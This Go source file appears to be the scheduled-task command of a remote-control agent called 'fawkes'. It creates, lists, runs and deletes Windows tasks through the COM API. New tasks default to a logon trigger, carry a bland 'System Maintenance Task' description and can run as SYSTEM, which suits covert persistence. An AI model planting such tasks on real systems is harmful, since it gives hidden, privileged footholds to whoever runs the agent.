//go:build windows
// +build windows

package commands

import (
	"fmt"
	"runtime"
	"strings"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"
)

type SchtaskCommand struct{}

func (c *SchtaskCommand) Name() string {
	return "schtask"
}

func (c *SchtaskCommand) Description() string {
	return "Manage scheduled tasks via Task Scheduler COM API (create, query, delete, run, list, enable, disable, stop)"
}

type schtaskArgs struct {
	Action  string `json:"action"`
	Name    string `json:"name"`
	Program string `json:"program"`
	Args    string `json:"args"`
	Trigger string `json:"trigger"`
	Time    string `json:"time"`
	User    string `json:"user"`
	RunNow  bool   `json:"run_now"`
	Filter  string `json:"filter"`
}

// TASK_TRIGGER_* constants moved to command_helpers.go

// Task Scheduler 2.0 COM constants (non-trigger)
const (
	// Task action types
	TASK_ACTION_EXEC = 0

	// Task creation flags
	TASK_CREATE_OR_UPDATE = 6

	// Task logon types
	TASK_LOGON_S4U                      = 2
	TASK_LOGON_INTERACTIVE_TOKEN        = 3
	TASK_LOGON_SERVICE_ACCOUNT          = 5
	TASK_LOGON_INTERACTIVE_TOKEN_OR_PWD = 6

	// Task run flags
	TASK_RUN_NO_FLAGS = 0
)

func (c *SchtaskCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := requireParams[schtaskArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	switch strings.ToLower(args.Action) {
	case "create":
		return schtaskCreate(args)
	case "query":
		return schtaskQuery(args)
	case "delete":
		return schtaskDelete(args)
	case "run":
		return schtaskRun(args)
	case "list":
		return schtaskList(args.Filter)
	case "enable":
		return schtaskSetEnabled(args, true)
	case "disable":
		return schtaskSetEnabled(args, false)
	case "stop":
		return schtaskStop(args)
	default:
		return errorf("Unknown action: %s. Use: create, query, delete, run, list, enable, disable, stop", args.Action)
	}
}

// taskSchedulerConnection holds ITaskService and ITaskFolder COM interfaces.
type taskSchedulerConnection struct {
	service *ole.IDispatch
	folder  *ole.IDispatch
}

// connectTaskScheduler initializes COM, creates ITaskService, connects, and gets root folder.
// Caller must call cleanup() when done.
func connectTaskScheduler() (*taskSchedulerConnection, func(), error) {
	runtime.LockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			runtime.UnlockOSThread()
			return nil, nil, fmt.Errorf("CoInitializeEx failed: %w", err)
		}
	}

	unknown, err := oleutil.CreateObject("Schedule.Service")
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("failed to create Schedule.Service: %w", err)
	}

	service, err := unknown.QueryInterface(ole.IID_IDispatch)
	unknown.Release()
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("failed to query IDispatch: %w", err)
	}

	// Connect to local task scheduler (pass nil variants for optional params)
	_, err = oleutil.CallMethod(service, "Connect", nil, nil, nil, nil)
	if err != nil {
		service.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("ITaskService.Connect failed: %w", err)
	}

	// Get root folder
	folderResult, err := oleutil.CallMethod(service, "GetFolder", `\`)
	if err != nil {
		service.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("GetFolder failed: %w", err)
	}
	folder := folderResult.ToIDispatch()

	conn := &taskSchedulerConnection{
		service: service,
		folder:  folder,
	}

	cleanup := func() {
		folder.Release()
		service.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
	}

	return conn, cleanup, nil
}

// triggerTypeFromString moved to command_helpers.go

// buildTaskXML generates Task Scheduler 2.0 XML for registration.
func buildTaskXML(args schtaskArgs) string {
	trigger := args.Trigger
	if trigger == "" {
		trigger = "ONLOGON"
	}

	triggerXML := buildTriggerXML(trigger, args.Time)

	actionXML := fmt.Sprintf(`      <Exec>
        <Command>%s</Command>`, escapeXML(args.Program))
	if args.Args != "" {
		actionXML += fmt.Sprintf("\n        <Arguments>%s</Arguments>", escapeXML(args.Args))
	}
	actionXML += "\n      </Exec>"

	principalXML := ""
	if args.User != "" {
		if strings.EqualFold(args.User, "SYSTEM") || strings.EqualFold(args.User, "NT AUTHORITY\\SYSTEM") {
			principalXML = `  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>`
		} else {
			principalXML = fmt.Sprintf(`  <Principals>
    <Principal id="Author">
      <UserId>%s</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>`, escapeXML(args.User))
		}
	}

	xml := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>System Maintenance Task</Description>
  </RegistrationInfo>
  <Triggers>
%s
  </Triggers>
  %s
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions Context="Author">
%s
  </Actions>
</Task>`, triggerXML, principalXML, actionXML)

	return xml
}

// buildTriggerXML, escapeXML moved to command_helpers.go

// extractXMLValue extracts the text content of a simple XML element.
func extractXMLValue(xml, tag string) string {
	openTag := "<" + tag + ">"
	closeTag := "</" + tag + ">"
	start := strings.Index(xml, openTag)
	if start == -1 {
		return ""
	}
	start += len(openTag)
	end := strings.Index(xml[start:], closeTag)
	if end == -1 {
		return ""
	}
	return strings.TrimSpace(xml[start : start+end])
}

// taskStateToString converts a task state value to a readable string.
func taskStateToString(state interface{}) string {
	// IRegisteredTask.State values
	switch v := state.(type) {
	case int32:
		return taskStateIntToString(int(v))
	case int64:
		return taskStateIntToString(int(v))
	case int:
		return taskStateIntToString(v)
	default:
		return fmt.Sprintf("%v", state)
	}
}

func taskStateIntToString(state int) string {
	switch state {
	case 0:
		return "Unknown"
	case 1:
		return "Disabled"
	case 2:
		return "Queued"
	case 3:
		return "Ready"
	case 4:
		return "Running"
	default:
		return fmt.Sprintf("Unknown(%d)", state)
	}
}
